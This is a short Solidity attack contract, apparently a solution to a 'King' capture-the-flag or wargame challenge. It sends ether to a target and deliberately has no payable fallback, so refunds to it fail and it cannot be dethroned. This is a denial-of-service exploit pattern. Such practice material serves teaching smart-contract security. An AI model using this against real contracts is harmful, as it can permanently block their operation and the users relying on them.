// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract KingAttack {

  function doYourThing(address _target) public payable {
    (bool result,) = _target.call{value:msg.value}("");
    if(!result) revert();
  }

  // OMG NO PAYABLE FALLBACK!!
}
